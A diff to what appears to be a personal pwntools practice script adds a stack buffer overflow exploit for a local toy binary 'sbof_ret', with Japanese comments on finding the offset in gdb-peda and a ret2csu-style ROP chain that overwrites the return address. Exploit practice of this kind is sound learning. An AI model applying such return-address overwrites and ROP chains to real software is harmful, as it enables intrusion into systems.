@@ -213,6 +213,38 @@ def main( args ):
         logging.debug( proc.recvline() )
         logging.debug( proc.recvline() )
     
+    elif args.ope == "sbof_ret":
+        
+        # gdb-peda で事前準備
+        # gdb-peda$ pattc 50
+        # 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+        # gdb-peda$ patto (AADAA;A
+        # (AADAA;A found at offset: 24
+        
+        # $ socat tcp-listen:4000,reuseaddr,fork, EXEC:"./sbof_ret"
+        # $ python pwnable.py --ope sbof_ret --debug
+        
+        adrs = 'localhost'
+        port = 4000
+        
+        # サーバに接続
+        proc = remote( adrs, port )
+        
+        logging.debug( proc.recvline(timeout=1) ) # Input Name >> 
+        
+        ropchain = b''
+        
+        ropchain += p64( 0x40127a )   # to pop rbx
+        ropchain += p64( 0 )          # rbx
+        ropchain += p64( 1 )          # rbp
+        ropchain += p64( 0xcafebabe ) # r12d -> edi
+        ropchain += p64( 0x0123456789ABCDEF ) # r13 -> RSI
+        ropchain += p64( 0xFEDCBA9876543210 ) # r14 -> RDX
+        ropchain += p64( 0x4011d1 )   # r15 for call
+        ropchain += p64( 0x401260 )   # to pop rbx
+        overwrite_ret_adrs( proc, 24, ropchain, dmy=b'\x00' )
+        
+    
     else:
         raise
 
